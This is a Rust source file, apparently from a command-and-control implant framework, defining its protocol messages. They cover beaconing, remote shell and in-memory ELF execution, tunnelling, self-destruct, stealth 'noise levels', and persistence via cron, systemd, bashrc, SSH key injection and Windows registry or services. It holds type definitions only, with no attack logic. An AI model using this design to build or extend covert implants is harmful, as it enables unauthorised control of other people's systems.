use serde::{Deserialize, Serialize};

use crate::noise::NoiseLevel;
use crate::types::*;

/// Wire message enum — covers the full protocol surface.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Message {
    Handshake(Handshake),
    HandshakeAck(HandshakeAck),
    Heartbeat(Heartbeat),
    HeartbeatAck(HeartbeatAck),

    TaskRequest(TaskRequest),
    TaskResponse(TaskResponse),
    /// Streamed output chunk for long-running tasks.
    TaskOutput(TaskOutput),

    FileUploadStart(FileUploadStart),
    FileData(FileData),
    FileTransferComplete(FileTransferComplete),
    FileDownloadRequest(FileDownloadRequest),

    ConfigUpdate(ConfigUpdateMsg),
    ConfigAck(ConfigAck),

    ModuleOutput(ModuleResult),

    ShellData(ShellData),
    ShellResize(ShellResize),
    ShellClose(ShellClose),

    TunnelOpen(TunnelOpen),
    TunnelData(TunnelData),
    TunnelClose(TunnelClose),
    /// Result of a TunnelOpen attempt — success or connect error.
    TunnelReady(TunnelReady),

    SelfDestruct,
    SelfDestructAck,
    Error(ProtoErrorMsg),
}

impl Message {
    pub fn type_id(&self) -> u8 {
        match self {
            Message::Handshake(_) => 0x01,
            Message::HandshakeAck(_) => 0x02,
            Message::Heartbeat(_) => 0x03,
            Message::HeartbeatAck(_) => 0x04,
            Message::TaskRequest(_) => 0x10,
            Message::TaskResponse(_) => 0x11,
            Message::TaskOutput(_) => 0x12,
            Message::FileUploadStart(_) => 0x20,
            Message::FileData(_) => 0x21,
            Message::FileTransferComplete(_) => 0x22,
            Message::FileDownloadRequest(_) => 0x23,
            Message::ConfigUpdate(_) => 0x30,
            Message::ConfigAck(_) => 0x31,
            Message::ModuleOutput(_) => 0x40,
            Message::ShellData(_) => 0x50,
            Message::ShellResize(_) => 0x51,
            Message::ShellClose(_) => 0x52,
            Message::TunnelOpen(_) => 0x60,
            Message::TunnelData(_) => 0x61,
            Message::TunnelClose(_) => 0x62,
            Message::TunnelReady(_) => 0x63,
            Message::SelfDestruct => 0xF0,
            Message::SelfDestructAck => 0xF1,
            Message::Error(_) => 0xFF,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Message::Handshake(_) => "Handshake",
            Message::HandshakeAck(_) => "HandshakeAck",
            Message::Heartbeat(_) => "Heartbeat",
            Message::HeartbeatAck(_) => "HeartbeatAck",
            Message::TaskRequest(_) => "TaskRequest",
            Message::TaskResponse(_) => "TaskResponse",
            Message::TaskOutput(_) => "TaskOutput",
            Message::FileUploadStart(_) => "FileUploadStart",
            Message::FileData(_) => "FileData",
            Message::FileTransferComplete(_) => "FileTransferComplete",
            Message::FileDownloadRequest(_) => "FileDownloadRequest",
            Message::ConfigUpdate(_) => "ConfigUpdate",
            Message::ConfigAck(_) => "ConfigAck",
            Message::ModuleOutput(_) => "ModuleOutput",
            Message::ShellData(_) => "ShellData",
            Message::ShellResize(_) => "ShellResize",
            Message::ShellClose(_) => "ShellClose",
            Message::TunnelOpen(_) => "TunnelOpen",
            Message::TunnelData(_) => "TunnelData",
            Message::TunnelClose(_) => "TunnelClose",
            Message::TunnelReady(_) => "TunnelReady",
            Message::SelfDestruct => "SelfDestruct",
            Message::SelfDestructAck => "SelfDestructAck",
            Message::Error(_) => "Error",
        }
    }
}

// payload structs

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Handshake {
    pub protocol_version: u8,
    pub agent_info: AgentInfo,
    /// HMAC-SHA256 over agent_info, keyed with PSK.
    pub auth_hmac: [u8; 32],
    /// X25519 public key for session key derivation.
    pub ephemeral_pubkey: [u8; 32],
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HandshakeAck {
    pub session_id: SessionId,
    pub config: AgentConfig,
    /// Handler's X25519 public key for session key derivation.
    pub ephemeral_pubkey: [u8; 32],
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Heartbeat {
    pub session_id: SessionId,
    pub timestamp: u64,
    pub pid: u32,
    pub uid: u32,
    pub idle_secs: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HeartbeatAck {
    pub timestamp: u64,
    /// Optional config override piggybacked on heartbeat response.
    pub config_update: Option<AgentConfig>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskRequest {
    pub task_id: TaskId,
    pub noise_level: NoiseLevel,
    pub task: Task,
}

/// The actual task to perform.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Task {
    /// Run a built-in syscall command (ls, cat, etc.)
    Builtin { cmd: String, args: Vec<String> },

    /// Execute a shell command (Quiet/Loud only).
    ShellExec { command: String },

    /// Run a recon module by name.
    RunModule { name: String },

    /// Execute ELF binary in memory.
    ExecMem { elf_data: Vec<u8>, args: Vec<String> },

    /// Allocate interactive PTY shell (Loud only).
    InteractiveShell,

    /// Install, remove, or list persistence mechanisms.
    Persist(PersistRequest),

    /// Enter tunnel relay mode (Loud only).
    StartTunnelMode,

    /// Queue all recon modules for scatter execution across beacon cycles.
    ReconAll,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistRequest {
    pub method: PersistMethod,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PersistMethod {
    /// Cron job: @reboot + optional periodic interval.
    Cron { interval_minutes: Option<u32> },
    /// Systemd user or system service.
    Systemd,
    /// ~/.bashrc hook (background exec on login).
    Bashrc,
    /// SSH authorized_keys injection.
    SshKey { pubkey: String },
    /// Registry Run key (HKCU or HKLM\Software\Microsoft\Windows\CurrentVersion\Run).
    RegistryRun,
    /// Scheduled Task via schtasks.exe (Loud — spawns process).
    ScheduledTask { interval_minutes: Option<u32> },
    /// Copy to Startup folder (%APPDATA%\...\Startup).
    StartupFolder,
    /// Windows Service via direct registry write (requires admin, writes HKLM).
    WindowsService { service_name: Option<String> },
    /// Remove all installed persistence.
    Clean,
    /// List installed persistence.
    List,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResponse {
    pub task_id: TaskId,
    pub result: TaskResult,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskOutput {
    pub task_id: TaskId,
    pub stream: OutputStream,
    pub data: Vec<u8>,
    pub is_final: bool,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
pub enum OutputStream {
    Stdout,
    Stderr,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileUploadStart {
    pub file_info: FileInfo,
    /// If true, file goes to memfd (memory only). If false, write to disk path.
    pub memory_only: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileData {
    pub chunk: FileChunk,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileTransferComplete {
    pub path: String,
    pub sha256: [u8; 32],
    pub success: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileDownloadRequest {
    pub remote_path: String,
    pub chunk_size: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellData {
    pub task_id: TaskId,
    pub data: Vec<u8>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellResize {
    pub task_id: TaskId,
    pub cols: u16,
    pub rows: u16,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellClose {
    pub task_id: TaskId,
    pub exit_code: Option<i32>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConfigUpdateMsg {
    pub config: AgentConfig,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConfigAck {
    pub applied: bool,
    pub message: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProtoErrorMsg {
    pub code: u16,
    pub message: String,
    pub task_id: Option<TaskId>,
}

// tunneling

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelOpen {
    pub channel_id: ChannelId,
    pub target_host: String,
    pub target_port: u16,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelData {
    pub channel_id: ChannelId,
    pub data: Vec<u8>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelClose {
    pub channel_id: ChannelId,
    pub reason: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TunnelReady {
    pub channel_id: ChannelId,
    pub success: bool,
    pub error: Option<String>,
}
